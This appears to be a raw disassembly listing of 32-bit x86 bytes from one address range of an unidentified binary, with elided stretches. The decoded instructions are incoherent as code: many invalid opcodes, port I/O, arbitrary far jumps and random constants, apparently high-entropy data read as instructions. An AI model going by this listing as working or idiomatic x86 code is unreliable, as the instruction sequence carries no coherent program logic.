  413fad:	dec    edx
  413fae:	adc    ebp,DWORD PTR [ecx+0x48]
  413fb1:	sub    edx,DWORD PTR [edx+0x1917c06e]
  413fb7:	test   eax,0x5f4dd8ab
  413fbc:	cmp    eax,0xd22df13a
  413fc1:	dec    edx
  413fc2:	jae    0x413f62
  413fc4:	lds    esi,FWORD PTR [edx-0x19]
  413fc7:	and    dh,ah
  413fc9:	adc    ecx,DWORD PTR [eax+0x2b68df0a]
  413fcf:	mov    WORD PTR [ebp+0x393c74d4],ds
  413fd5:	fld    DWORD PTR [eax-0x249a1295]
  413fdb:	jecxz  0x414056
  413fdd:	sub    BYTE PTR [edi],bh
  413fdf:	mov    bl,0xf8
  413fe1:	in     eax,0x3b
  413fe3:	sub    eax,0xda5b2efb
  413fe8:	call   0x56d196a
  413fed:	into   
  413fee:	lock inc edi
  413ff0:	(bad)
  413ff4:	mov    ah,0xff
  413ff6:	mov    dh,0x6a
  413ff8:	inc    ebp
  413ff9:	push   eax
  413ffa:	fwait
  413ffb:	rol    BYTE PTR ds:0xd2d7ea89,0x58
  414002:	mov    ebx,0x1f749910
  414007:	mov    al,0x60
  414009:	dec    esp
  41400a:	vmovaps YMMWORD PTR [edx],ymm7
  41400e:	iret   
  41400f:	div    BYTE PTR [eax+0x5d5ab0b8]
  414015:	repnz push ecx
  414017:	pop    edi
  414018:	mov    al,0x4f
  41401a:	push   esp
  41401b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41401c:	mov    ebx,0x51931118
  414021:	(bad)  
  414022:	jno    0x413fbb
  414024:	in     al,dx
  414025:	in     eax,0xc7
  414027:	addr16 das 
  414029:	das    
  41402a:	ret    
  41402b:	sub    BYTE PTR fs:[ebp+0x53],dl
  41402f:	push   edi
  414030:	add    al,0x72
  414032:	or     esp,0xf2f34397
  414038:	jo     0x414039
  41403a:	lds    ebp,FWORD PTR [edx+ecx*8]
  41403d:	inc    ecx
  41403e:	mov    eax,DWORD PTR es:[edi-0xaacf817]
  414045:	call   0xf03f808e
  41404a:	test   al,0xe3
  41404c:	mov    edx,0x67153acc
  414051:	cmc    
  414052:	ror    BYTE PTR [ebx],0x9c
  414055:	dec    edi
  414056:	sub    WORD PTR [ebp+0x3],bx
  41405a:	push   esp
  41405b:	int3   
  41405c:	mov    dl,0xb3
  41405e:	jne    0x4140b4
  414060:	lea    edx,[esi+0x1110566]
  414066:	dec    BYTE PTR [edx-0x1770d990]
  41406c:	mov    cl,0x0
	...
  4140d6:	pop    edx
  4140d7:	ficom  DWORD PTR [esi+0x60]
  4140da:	(bad)  
  4140db:	in     al,dx
  4140dc:	jle    0x4140d8
  4140de:	call   0xcaf3:0x65d52e96
  4140e5:	mov    BYTE PTR [esi-0x28],ah
  4140e8:	add    BYTE PTR [eax],al
  4140ea:	inc    DWORD PTR [eax]
  4140ec:	add    BYTE PTR [eax],al
  4140ee:	and    eax,0xd01f85f3
  4140f3:	add    eax,0xc43f8633
  4140f8:	data16 sbb BYTE PTR [edi],cl
  4140fb:	ins    BYTE PTR es:[edi],dx
  4140fc:	loopne 0x4140b6
  4140fe:	pop    ds
  4140ff:	jge    0x4140b0
  414101:	adc    BYTE PTR [esi-0x7f],dh
  414104:	push   ss
  414105:	outs   dx,BYTE PTR ds:[esi]
  414106:	or     DWORD PTR [edi+0x572377e2],esi
  41410c:	sub    dh,dl
  41410e:	jl     0x414115
  414110:	dec    ebx
  414111:	enter  0xe98,0x46
  414115:	out    dx,eax
  414116:	xor    esp,DWORD PTR [eax-0x6bf08aed]
  41411c:	gs jmp 0x414102
  41411f:	(bad)  
  414120:	lods   eax,DWORD PTR ds:[esi]
  414121:	fcomp  QWORD PTR [eax+0x7c]
  414124:	add    edx,DWORD PTR [ebx+0xbd81f7d]
  41412a:	pop    edx
  41412b:	xor    eax,0x1cd20cec
  414130:	(bad)  
  414131:	in     al,dx
  414132:	push   0xffffffa6
  414134:	cmovne ebx,DWORD PTR [ecx]
  414137:	dec    ebp
  414138:	mov    ds:0x4568bd31,al
  41413d:	pushaw 
  41413f:	dec    esi
  414140:	js     0x414101
  414142:	fs int3 
  414144:	adc    ebp,DWORD PTR [esi-0x6a]
  414147:	fnsave [edx-0x1b]
  41414a:	and    DWORD PTR es:[edi],esp
  41414d:	lods   al,BYTE PTR ds:[esi]
  41414e:	in     eax,0xa
  414150:	pop    ebx
  414151:	jb     0x414124
  414153:	mov    DWORD PTR [ebx+0x2d],0xe08faae9
  41415a:	jmp    0x5bf4:0xb37a2d39
  414161:	sbb    bh,BYTE PTR [ebx*4-0x1372b9e0]
  414168:	(bad)  
  414169:	fisubr DWORD PTR [eax+ebp*1+0x42]
  41416d:	(bad)  
  41416e:	pop    ds
  41416f:	and    eax,0x2ccbc096
  414174:	das    
  414175:	inc    ebx
  414176:	das    
  414177:	lahf   
  414178:	mov    edi,0x7abbb210
  41417d:	out    0x48,al
  41417f:	jmp    0x1327:0xe99d9457
  414186:	push   esp
  414187:	in     eax,dx
  414188:	out    dx,al
  414189:	cmc    
  41418a:	scas   eax,DWORD PTR es:[edi]
  41418b:	xchg   cl,bh
  41418d:	addr16 mov ah,0x83
  414190:	arpl   WORD PTR [eax-0x7d],sp
  414193:	sar    esi,1
  414195:	cdq    
  414196:	ja     0x414161
  414198:	loopne 0x414128
  41419a:	sbb    BYTE PTR [ecx-0x1c],bh
  41419d:	repnz sahf 
  41419f:	adc    ebp,DWORD PTR [ebx-0x69]
  4141a2:	dec    eax
  4141a3:	xchg   BYTE PTR [esi+0x54e8b68d],al
  4141a9:	scas   al,BYTE PTR es:[edi]
  4141aa:	lock pusha 
  4141ac:	or     dh,BYTE PTR [edx-0x55bfd221]
  4141b2:	repnz adc eax,0xce319c1d
  4141b8:	std    
  4141b9:	mov    dl,0xde
  4141bb:	das    
  4141bc:	adc    eax,DWORD PTR [edi+0xd]
  4141bf:	test   eax,0xee04ce63
  4141c4:	nop
  4141c5:	push   eax
  4141c6:	and    esp,ebx
  4141c8:	sbb    BYTE PTR [edi-0x68],0xb6
  4141cc:	cmp    eax,0xa616c005
  4141d1:	mov    ecx,0xdd7f951d
  4141d6:	retf   
  4141d7:	jmp    0x1e4c:0x57883019
  4141de:	loop   0x41420e
  4141e0:	in     eax,0xb2
  4141e2:	jne    0x414171
  4141e4:	daa    
  4141e5:	retf   
  4141e6:	xor    dh,BYTE PTR [ecx-0xe]
  4141e9:	pop    ecx
  4141ea:	leave  
  4141eb:	outs   dx,DWORD PTR ds:[esi]
  4141ec:	iret   
	...
  414255:	add    BYTE PTR [edx],al
  414257:	adc    al,BYTE PTR [ecx]
  414259:	mov    ds:0xb3a2b311,eax
  41425e:	mov    DWORD PTR [ecx+0x37],edx
  414261:	push   edi
  414262:	and    BYTE PTR [ebx+0x6c],bh
  414265:	mov    esp,0xd965
  41426a:	inc    DWORD PTR [eax]
  41426c:	add    BYTE PTR [eax],al
  41426e:	cmp    eax,DWORD PTR [esi-0x69]
  414271:	mov    al,ds:0x1bdec98f
  414276:	out    0xf5,al
  414278:	dec    ecx
  414279:	out    dx,al
  41427a:	xchg   edx,eax
  41427b:	push   cs
  41427c:	scas   al,BYTE PTR es:[edi]
  41427d:	aam    0xa3
  41427f:	repz xor dl,BYTE PTR [edx+ebx*8]
  414283:	sub    edi,edx
  414285:	xchg   edi,eax
  414286:	jp     0x41427b
  414288:	js     0x41420c
  41428a:	mul    cl
  41428c:	sti    
  41428d:	add    ecx,ebp
  41428f:	and    esp,DWORD PTR [edi]
  414291:	imul   ebx,edi,0xffffffc8
  414294:	dec    ebp
  414295:	imul   ebx,DWORD PTR [edx+0x116da25d],0xc968395b
  41429f:	cmp    eax,0x7b146a02
  4142a4:	add    al,0x51
  4142a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142a7:	lods   al,BYTE PTR ds:[esi]
  4142a8:	or     al,0x57
  4142aa:	add    edx,DWORD PTR [ebx]
  4142ac:	shl    dl,0x14
  4142af:	jnp    0x41423b
  4142b1:	in     al,dx
  4142b2:	sub    edx,ecx
  4142b4:	ja     0x414323
  4142b6:	adc    al,0x37
  4142b8:	inc    esp
  4142b9:	push   cs
  4142ba:	aas    
  4142bb:	inc    ecx
  4142bc:	fstp   QWORD PTR ds:0x2a8c6397
  4142c2:	std    
  4142c3:	js     0x4142c1
  4142c5:	dec    esi
  4142c6:	inc    ecx
  4142c7:	nop
  4142c8:	es mov dh,0x5f
  4142cb:	inc    eax
  4142cc:	inc    esp
  4142cd:	ja     0x414298
  4142cf:	pop    es
  4142d0:	or     al,0xa2
  4142d2:	call   0xf3fb:0xe33665ab
  4142d9:	inc    edi
  4142da:	mov    bh,0xbe
  4142dc:	test   DWORD PTR [eax+0x1b],edx
  4142df:	mov    eax,0x27067a4e
  4142e4:	inc    edi
  4142e5:	xlat   BYTE PTR ds:[ebx]
  4142e6:	fcom   DWORD PTR [edx+0x28]
  4142e9:	jl     0x414310
  4142eb:	cmp    eax,DWORD PTR [eax-0x7236bc60]
  4142f1:	aaa    
  4142f2:	out    dx,al
  4142f3:	jecxz  0x41431d
  4142f5:	push   esp
  4142f6:	in     eax,dx
  4142f7:	cmp    BYTE PTR [ecx-0x39],bh
  4142fa:	rol    DWORD PTR [ebx+0x25cc7827],1
  414300:	dec    ecx
  414301:	(bad)  
  414302:	pop    esi
  414303:	int3   
  414304:	pop    eax
  414305:	in     al,0xc3
  414307:	sub    BYTE PTR [edx],al
  414309:	jmp    0xcd14:0x82d0484b
  414310:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414311:	sbb    eax,0x9849a3b
  414316:	mov    BYTE PTR [ecx-0x40f1c328],al
  41431c:	mov    al,0x41
  41431e:	and    bl,BYTE PTR [ebp-0x2394ba0b]
  414324:	test   eax,0x1e05a714
  414329:	adc    bl,BYTE PTR [ecx-0x65]
  41432c:	dec    esi
  41432d:	ret    
  41432e:	not    BYTE PTR [edx-0xf0f36fd]
  414334:	mov    ch,0x1
  414336:	ss hlt 
  414338:	adc    ch,BYTE PTR ds:0xb753fe9f
  41433e:	dec    ebx
  41433f:	sbb    ah,BYTE PTR [edi]
  414341:	lods   al,BYTE PTR ds:[esi]
  414342:	and    al,0x5f
  414344:	ds xchg esp,eax
  414346:	add    eax,DWORD PTR [edx+ebx*4+0x58]
  41434a:	cli    
  41434b:	pop    ecx
  41434c:	popf   
  41434d:	cmp    BYTE PTR [ecx-0x4703a44d],cl
  414353:	cwde   
  414354:	pop    es
  414355:	mov    cl,0x9c
  414357:	cwde   
  414358:	push   ecx
  414359:	pop    eax
  41435a:	loop   0x4142fc
  41435c:	jmp    0x4142fb
  41435e:	or     eax,0x10925dff
  414363:	mov    ch,0x6a
  414365:	push   ss
  414366:	lahf   
  414367:	in     al,dx
  414368:	scas   eax,DWORD PTR es:[edi]
  414369:	xlat   BYTE PTR ds:[ebx]
  41436a:	stc    
  41436b:	mov    bh,0x9f
	...
  4143d5:	add    BYTE PTR [ecx],al
  4143d7:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  4143de:	rol    DWORD PTR [ebp+0x5e],0xa1
  4143e2:	shl    BYTE PTR [edi-0x259bcf13],0x0
  4143e9:	add    bh,bh
  4143eb:	add    BYTE PTR [eax],al
  4143ed:	add    ah,dl
  4143ef:	jmp    0xe7920cb4
  4143f4:	gs push esi
  4143f6:	or     eax,0x47c69aa3
  4143fb:	jb     0x4143c2
  4143fd:	clc    
  4143fe:	xchg   edx,esi
  414400:	adc    al,dl
  414402:	dec    esp
  414403:	mov    edi,0x50cb96e3
  414409:	jmp    FWORD PTR [esi]
  41440b:	in     al,0xcd
  41440d:	push   0xcf437865
  414412:	xchg   BYTE PTR [eax-0x154de946],bh
  414418:	mov    ch,0x49
  41441a:	add    DWORD PTR [eax+eax*1],ebx
  41441d:	sahf   
  41441e:	cmp    cl,cl
  414420:	cli    
  414421:	xor    DWORD PTR [ebx],ebx
  414423:	add    esp,ebp
  414425:	jne    0x414441
  414427:	pop    ds
  414428:	push   0xffffff8e
  41442a:	(bad)  
  41442b:	xchg   ebp,eax
  41442c:	out    0x4,eax
  41442e:	loopne 0x4143b0
  414430:	sub    DWORD PTR [ecx-0xf],esi
  414433:	lds    ebx,FWORD PTR [esi]
  414435:	ret    
  414436:	xor    ecx,DWORD PTR [eax+eiz*1-0x37]
  41443a:	lahf   
  41443b:	lds    ebx,FWORD PTR [esi]
  41443d:	nop
  41443e:	in     eax,dx
  41443f:	inc    BYTE PTR [ecx+ecx*8]
  414442:	and    BYTE PTR [edi-0x10],ah
  414445:	mov    al,0xc2
  414447:	(bad)  
  414448:	mov    eax,0x45f9d973
  41444d:	retf   0x90e6
  414450:	in     eax,dx
  414451:	iret   
  414452:	dec    ecx
  414453:	mov    DWORD PTR [eax+0x7d],esi
  414456:	out    dx,eax
  414457:	add    ecx,DWORD PTR [edi+0x52]
  41445a:	push   esi
  41445b:	(bad)  
  41445c:	xchg   esi,eax
  41445d:	inc    esp
  41445e:	dec    eax
  41445f:	mov    BYTE PTR [ebp-0x39],ch
  414462:	stos   BYTE PTR es:[edi],al
  414463:	inc    edi
  414464:	gs aas 
  414466:	shr    DWORD PTR [ebx-0x50],0x9f
  41446a:	pusha  
  41446b:	fdivr  DWORD PTR [esi+edx*8-0x48]
  41446f:	adc    eax,0xd81c9733
  414474:	ja     0x4144ea
  414476:	iret   
  414477:	bound  esp,QWORD PTR [ecx-0x69]
  41447a:	ret    0xdc80
  41447d:	les    edi,FWORD PTR [ecx]
  41447f:	iret   
  414480:	addr16 in al,0x57
  414483:	imul   ecx,edx,0x1f
  414486:	stc    
  414487:	mov    ds:0x1662ac8c,al
  41448c:	scas   eax,DWORD PTR es:[edi]
  41448d:	pop    esi
  41448e:	call   edx
  414490:	sub    eax,DWORD PTR [edi+0x3523b19e]
  414496:	icebp  
  414497:	std    
  414498:	jnp    0x414459
  41449a:	aam    0x94
  41449c:	inc    ebp
  41449d:	mov    dh,0x41
  41449f:	sub    al,0xb8
  4144a1:	js     0x4144e2
  4144a3:	stc    
  4144a4:	xchg   esp,eax
  4144a5:	dec    esp
  4144a6:	sti    
  4144a7:	cmp    DWORD PTR [edi+0x3b],0x804a3840
  4144ae:	das    
  4144af:	add    esi,DWORD PTR [edi]
  4144b1:	pop    ebx
  4144b2:	xchg   edx,eax
  4144b3:	call   0xf0ed9eb1
  4144b8:	ror    BYTE PTR [esi-0x4e],1
  4144bb:	inc    esp
  4144bc:	fsubr  st(0),st
  4144be:	jmp    0xf386:0x8f9fac70
  4144c5:	mov    al,BYTE PTR [eax+0x59786278]
  4144cb:	hlt    
  4144cc:	dec    edi
  4144cd:	mov    esi,0x8d4ee0d1
  4144d2:	ds push edi
  4144d4:	stos   BYTE PTR es:[edi],al
  4144d5:	inc    eax
  4144d6:	adc    eax,0x82fa4a0
  4144db:	adc    DWORD PTR [ebp-0x44],0x615c3b1
  4144e2:	xor    ah,al
  4144e4:	jae    0x414550
  4144e6:	fld1   
  4144e8:	cmp    DWORD PTR [edi],ecx
  4144ea:	pop    edi
  4144eb:	pop    ebp
  4144ec:	jno    0x4144ee
	...
  414556:	pop    ebx
  414557:	jae    0x41459b
  414559:	or     eax,0x775f3d6a
  41455e:	pop    ds
  41455f:	dec    edi
  414560:	or     cl,BYTE PTR [esi-0x3e]
  414563:	jp     0x4144f3
  414565:	in     al,dx
  414566:	arpl   bx,bx
  414568:	add    BYTE PTR [eax],al
  41456a:	inc    DWORD PTR [eax]
  41456c:	add    BYTE PTR [eax],al
  41456e:	xlat   BYTE PTR ds:[ebx]
  41456f:	sbb    eax,0xfa6f1314
  414574:	js     0x414506
  414576:	int3   
  414577:	aad    0xa7
  414579:	mov    al,ds:0xb253b2e4
  41457e:	repz repz lds esi,FWORD PTR [edi+eiz*8]
  414583:	and    al,0x52
  414585:	outs   dx,BYTE PTR ds:[esi]
  414586:	or     al,0x40
  414588:	add    eax,0xda89b877
  41458d:	repnz or bh,dh
  414590:	pusha  
  414591:	test   eax,0xccadf7e2
  414596:	jecxz  0x4145f3
  414598:	ret    0x1334
  41459b:	sti    
  41459c:	xchg   ecx,eax
  41459d:	inc    esp
  41459e:	test   BYTE PTR [edi+0x16],bh
  4145a1:	push   esi
  4145a2:	retf   
  4145a3:	into   
  4145a4:	add    DWORD PTR [ecx],ebp
  4145a6:	stos   BYTE PTR es:[edi],al
  4145a7:	test   BYTE PTR [ebx-0x29],0xe2
  4145ab:	rcl    DWORD PTR [esi],0x72
  4145ae:	inc    esp
  4145af:	lahf   
  4145b0:	dec    ebx
  4145b1:	mov    ebx,0x8bffd83b
  4145b6:	out    0x1d,eax
  4145b8:	rol    BYTE PTR [edi],cl
  4145ba:	ficom  WORD PTR [ebp-0x20]
  4145bd:	rcl    DWORD PTR [ecx],1
  4145bf:	ins    DWORD PTR es:[edi],dx
  4145c0:	pop    ebx
  4145c1:	fbld   TBYTE PTR gs:[eax-0x74375c7d]
  4145c8:	popa   
  4145c9:	imul   ebp,DWORD PTR [esi-0x3052e45b],0x81bb0e8
  4145d3:	mov    al,0xcc
  4145d5:	jns    0x414631
  4145d7:	xchg   ebx,eax
  4145d8:	pop    ds
  4145d9:	sti    
  4145da:	jl     0x414574
  4145dc:	and    ch,BYTE PTR [esi]
  4145de:	jle    0x414573
  4145e0:	add    al,0x56
  4145e2:	das    
  4145e3:	stos   BYTE PTR es:[edi],al
  4145e4:	ror    DWORD PTR [edx],cl
  4145e6:	sub    DWORD PTR [eax-0x7c],ecx
  4145e9:	dec    ecx
  4145ea:	xor    eax,0xc7b18a72
  4145ef:	dec    ebp
  4145f0:	es push ebp
  4145f2:	sub    al,0xb9
  4145f4:	jecxz  0x414635
  4145f6:	mov    ebp,0xf47e7307
  4145fb:	icebp  
  4145fc:	enter  0xe3c0,0xd
  414600:	and    DWORD PTR [eax+0x2c],edx
  414603:	mov    esi,0x5923b836
  414608:	ins    DWORD PTR es:[edi],dx
  414609:	push   eax
  41460a:	out    0x1a,al
  41460c:	mov    edx,0xf03b65c7
  414611:	in     eax,dx
  414612:	push   ss
  414613:	retf   0x4d5b
  414616:	jecxz  0x414675
  414618:	(bad)  
  41461a:	mov    al,ds:0xc32b192d
  41461f:	pop    ebx
  414620:	fsub   DWORD PTR [esi]
  414622:	push   ss
  414623:	inc    eax
  414624:	jecxz  0x414679
  414626:	(bad)  
  414627:	call   edi
  414629:	jb     0x41464d
  41462b:	push   es
  41462c:	jp     0x41461e
  41462e:	iret   
  41462f:	pop    ds
  414630:	cli    
  414631:	fisub  WORD PTR [ecx-0x1e]
  414634:	and    al,0x8c
  414636:	pop    ebp
  414637:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414638:	repnz mov cl,0x39
  41463b:	out    dx,eax
  41463c:	xlat   BYTE PTR ds:[ebx]
  41463d:	jne    0x414685
  41463f:	ja     0x414671
  414641:	pop    ds
  414642:	imul   eax,DWORD PTR [edx+0x7553cf71],0x1b1d05cf
  41464c:	out    0x2e,eax
  41464e:	pop    es
  41464f:	dec    esi
  414650:	ret    
  414651:	dec    esp
  414652:	push   ebp
  414653:	mov    ss,esp
  414655:	inc    ebp
  414656:	fadd   DWORD PTR [edi+0x441c9eba]
  41465c:	pop    ebx
  41465d:	add    dl,cl
  41465f:	popf   
  414660:	xor    esp,DWORD PTR [edi]
  414662:	jno    0x4145f1
  414664:	mov    eax,ds:0x7e030392
  414669:	mov    bl,0xa5
  41466b:	jbe    0x4146c8
	...
  4146d5:	add    BYTE PTR [edi+0x5e],bh
  4146d8:	cmc    
  4146d9:	ins    DWORD PTR es:[edi],dx
  4146da:	cmc    
  4146db:	out    dx,eax
  4146dc:	call   FWORD PTR [esi+0x17]
  4146df:	enter  0xab7a,0x17
  4146e3:	push   edi
  4146e4:	xchg   edx,eax
  4146e5:	outs   dx,DWORD PTR ds:[esi]
  4146e6:	(bad)  
  4146e7:	fadd   QWORD PTR [eax]
  4146e9:	add    bh,bh
  4146eb:	add    BYTE PTR [eax],al
  4146ed:	add    BYTE PTR [eax],cl
  4146ef:	(bad)  
  4146f0:	in     al,dx
  4146f1:	cmp    DWORD PTR [eax+0x16],ebx
  4146f4:	push   eax
  4146f5:	out    dx,al
  4146f6:	mov    edi,0x398330e4
  4146fb:	fidivr WORD PTR [ecx+0x2e]
  4146fe:	outs   dx,DWORD PTR ds:[esi]
  4146ff:	push   cs
  414700:	pop    esi
  414701:	xor    bl,al
  414703:	je     0x414694
  414705:	xor    esp,DWORD PTR [edx-0x27]
  414708:	xor    al,0xc7
  41470a:	push   0x86befe02
  41470f:	into   
  414710:	cdq    
  414711:	mov    esp,DWORD PTR [esi]
  414713:	sbb    ebx,ecx
  414715:	push   esi
  414716:	add    al,0x5e
  414718:	int3   
  414719:	dec    edx
  41471a:	test   BYTE PTR [eax],ah
  41471c:	hlt    
  41471d:	lea    esp,[ecx+0x10]
  414720:	fucomp st(6)
  414722:	js     0x4146df
  414724:	lods   al,BYTE PTR ds:[esi]
  414725:	jge    0x414775
  414727:	jne    0x414766
  414729:	ficomp WORD PTR [eax]
  41472b:	int3   
  41472c:	cmp    al,0x7a
  41472e:	sub    eax,0xc31f217c
  414733:	mov    eax,ds:0xb8e71a90
  414738:	and    edi,DWORD PTR ds:0x80b48865
  41473e:	popa   
  41473f:	mov    dh,0xff
  414741:	jbe    0x414753
  414743:	push   ecx
  414744:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414745:	xchg   ebx,eax
  414746:	out    0xbe,al
  414748:	push   ecx
  414749:	jae    0x4146dd
  41474b:	pop    eax
  41474c:	dec    esp
  41474d:	inc    esi
  41474e:	nop
  41474f:	xchg   ecx,eax
  414750:	inc    eax
  414751:	scas   eax,DWORD PTR es:[edi]
  414752:	mov    ds:0xff305681,al
  414757:	repnz rol BYTE PTR [edi-0x6e],cl
  41475b:	adc    BYTE PTR [ebx+0x225019c5],dh
  414761:	shr    DWORD PTR [edi+edx*1-0xe3528eb],0xbe
  414769:	(bad)  [ebp-0x19]
  41476c:	xor    esp,DWORD PTR [esi+0x70]
  41476f:	rcl    DWORD PTR gs:[edi-0x58],0xf0
  414774:	sub    cl,al
  414776:	stos   BYTE PTR es:[edi],al
  414777:	iret   
  414778:	fisttp DWORD PTR ds:0x2c1707d1
  41477e:	(bad)  
  41477f:	sahf   
  414780:	or     al,0x87
  414782:	daa    
  414783:	xlat   BYTE PTR ds:[ebx]
  414784:	add    ecx,DWORD PTR [esp+eax*2]
  414787:	xchg   ecx,eax
  414788:	inc    ebp
  414789:	and    al,0x4d
  41478b:	pop    ss
  41478c:	repz out dx,eax
  41478e:	push   ecx
  41478f:	xchg   ecx,eax
  414790:	popf   
  414791:	fs aas 
  414793:	adc    eax,0x607ecacb
  414798:	xchg   esi,eax
  414799:	ss ss loop 0x414769
  41479d:	sti    
  41479e:	mov    dl,0xf4
  4147a0:	pop    ecx
  4147a1:	arpl   sp,ax
  4147a3:	into   
  4147a4:	fsub   DWORD PTR [eax+edx*4+0x60]
  4147a8:	sub    DWORD PTR [edx+0x17],eax
  4147ab:	inc    ebp
  4147ac:	cmp    BYTE PTR [ebx-0x7e],ah
  4147af:	popf   
  4147b0:	push   es
  4147b1:	(bad)  
  4147b2:	jbe    0x4147dc
  4147b4:	mov    ah,0x85
  4147b6:	mov    edx,0x355aba5b
  4147bb:	xchg   ebp,eax
  4147bc:	jge    0x41477c
  4147be:	mov    esp,0xf38a18b9
  4147c3:	jns    0x41476f
  4147c5:	out    0x3e,eax
  4147c7:	jnp    0x414802
  4147c9:	stos   BYTE PTR es:[edi],al
  4147ca:	or     edx,DWORD PTR [eax]
  4147cc:	cld    
  4147cd:	inc    edx
  4147ce:	or     BYTE PTR [edi-0x5163faef],bh
  4147d4:	sub    al,0xdd
  4147d6:	push   ebp
  4147d7:	ds nop
  4147d9:	sub    BYTE PTR ds:0x540d432e,cl
  4147df:	xchg   ebp,eax
  4147e0:	xchg   edx,eax
  4147e1:	dec    edx
  4147e2:	adc    eax,0x3d0093a2
  4147e7:	retf   
  4147e8:	mov    fs,WORD PTR [edi+0x10]
  4147eb:	xchg   ebx,eax
  4147ec:	loopne 0x4147ee
	...
  414856:	jle    0x414887
  414858:	add    DWORD PTR [ebp+0x51],ebp
  41485b:	outs   dx,DWORD PTR ds:[esi]
  41485c:	jle    0x41489d
  41485e:	aas    
  41485f:	mov    BYTE PTR [esi],cl
  414861:	cmp    eax,0x58a53c48
  414866:	popa   
  414867:	fld    QWORD PTR [eax]
  414869:	add    bh,bh
  41486b:	add    BYTE PTR [eax],al
  41486d:	add    BYTE PTR ds:0x4b0ba8dc,bh
  414873:	push   cs
  414874:	in     eax,0xf4
  414876:	out    0xed,al
  414878:	das    
  414879:	neg    BYTE PTR [edx+ebx*2+0x38]
  41487d:	cmp    edx,DWORD PTR [edi+0x56]
  414880:	jbe    0x414849
  414882:	cwde   
  414883:	idiv   DWORD PTR [ebp-0x80]
  414886:	inc    edx
  414887:	mov    ds:0xa3546251,eax
  41488c:	jg     0x414883
  41488e:	jle    0x41484c
  414890:	(bad)  [ecx-0x53012b75]
  414896:	scas   eax,DWORD PTR es:[edi]
  414897:	mov    eax,ss
  414899:	cli    
  41489a:	mov    ebp,0x87cc004b
  41489f:	stos   BYTE PTR es:[edi],al
  4148a0:	lds    eax,FWORD PTR [esi+edx*2]
  4148a3:	dec    ebp
  4148a4:	mov    eax,0x60b32503
  4148a9:	push   0xffffff81
  4148ab:	(bad)  
  4148ac:	mov    eax,0x4e0848f4
  4148b1:	dec    eax
  4148b2:	clc    
  4148b3:	fisub  WORD PTR [ebp+0x28]
  4148b6:	cmp    DWORD PTR [ebx],0x20
  4148b9:	mov    DWORD PTR [edx+0x69],0x97f1e669
  4148c0:	xchg   ebp,eax
  4148c1:	imul   esp,DWORD PTR [esp+ebp*1],0x70ceab
  4148c8:	out    dx,al
  4148c9:	xchg   esp,eax
  4148ca:	jno    0x4148f8
  4148cc:	das    
  4148cd:	xor    al,bh
  4148cf:	scas   eax,DWORD PTR es:[edi]
  4148d0:	push   eax
  4148d1:	sbb    eax,0xf0d0cbd3
  4148d6:	gs dec ebp
  4148d8:	inc    esp
  4148d9:	cmp    edx,DWORD PTR [ecx+0x6d]
  4148dc:	inc    ebp
  4148dd:	mov    al,ds:0xc058a95d
  4148e2:	aad    0xa8
  4148e4:	and    dl,0xcd
  4148e7:	repnz or BYTE PTR ds:0xdc92c430,al
  4148ee:	stos   DWORD PTR es:[edi],eax
  4148ef:	imul   esi,DWORD PTR [edx-0x4295e15f],0xffffffd8
  4148f6:	and    cl,bh
  4148f8:	mov    es,WORD PTR [ecx]
  4148fa:	ret    
  4148fb:	je     0x414942
  4148fd:	xchg   ecx,eax
  4148fe:	add    BYTE PTR [ebp+0x12],cl
  414901:	jp     0x414940
  414903:	dec    edx
  414904:	not    ebx
  414906:	sbb    BYTE PTR [eax],cl
  414908:	ja     0x414941
  41490a:	mov    ch,0xa3
  41490c:	pop    ebp
  41490d:	inc    eax
  41490e:	mov    cl,0x2
  414910:	pop    eax
  414911:	imul   esi,DWORD PTR [esi+0x50],0x8c7b9a45
  414918:	test   DWORD PTR [ecx-0x49],eax
  41491b:	and    BYTE PTR [ecx+eiz*1-0x6daee41a],al
  414922:	and    dh,BYTE PTR [eax+0x2f6951d3]
  414928:	scas   eax,DWORD PTR es:[edi]
  414929:	outs   dx,DWORD PTR ds:[esi]
  41492a:	je     0x4148ef
  41492c:	dec    ebx
  41492d:	sbb    al,0xc
  41492f:	dec    esi
  414930:	mov    al,0x32
  414932:	push   0x31
  414934:	in     eax,dx
  414935:	addr16 xor al,0x5a
  414938:	xor    ebx,DWORD PTR [ebp+0x11]
  41493b:	and    edi,DWORD PTR [edx]
  41493d:	jmp    0x414979
  41493f:	(bad)  
  414941:	shl    BYTE PTR [esi+ebp*1],0xcc
  414945:	sub    BYTE PTR [esi],ch
  414947:	outs   dx,BYTE PTR ds:[esi]
  414948:	xor    BYTE PTR [edi],ch
  41494a:	dec    ebx
  41494b:	mov    ds:0xf18e1bea,eax
  414950:	or     eax,0x760c3a8a
  414955:	test   eax,0xa05dbab1
  41495a:	test   edx,0xa2049b02
  414960:	sar    DWORD PTR [ebx],0xa4
  414963:	test   DWORD PTR [esi],esp
  414965:	dec    edx
  414966:	sbb    eax,0xaaf4b6e
  41496b:	call   0x0:0xf9
	...
  4149d6:	or     edi,DWORD PTR [esi-0x2e]
  4149d9:	and    esi,edi
  4149db:	scas   eax,DWORD PTR es:[edi]
  4149dc:	sti    
  4149dd:	jle    0x4149c5
  4149df:	pop    edx
  4149e0:	push   ds
  4149e1:	pop    es
  4149e2:	cdq    
  4149e3:	adc    BYTE PTR [ebx+0x16],ah
  4149e6:	pusha  
  4149e7:	fiadd  WORD PTR [eax]
  4149e9:	add    bh,bh
  4149eb:	add    BYTE PTR [eax],al
  4149ed:	add    BYTE PTR [eax+0x3090cad4],ch
  4149f3:	jo     0x414987
  4149f5:	les    esi,FWORD PTR [ebx-0x1a]
  4149f8:	test   al,0x38
  4149fa:	mov    BYTE PTR [ebx],dl
  4149fc:	mov    BYTE PTR [ebp-0x44],bl
  4149ff:	push   ebx
  414a00:	cmp    al,0xcc
  414a02:	push   ebp
  414a03:	and    DWORD PTR [edi+0x58],edx
  414a06:	idiv   BYTE PTR [ecx-0xf]
  414a09:	dec    edx
  414a0a:	cmp    BYTE PTR [ebp-0x6f],cl
  414a0d:	inc    ecx
  414a0e:	mov    BYTE PTR cs:[ecx-0x2cc02c40],bh
  414a15:	cwde   
  414a16:	sbb    edx,esi
  414a18:	scas   eax,DWORD PTR es:[edi]
  414a19:	sbb    eax,0xbb1c4924
  414a1e:	sti    
  414a1f:	xchg   ebp,eax
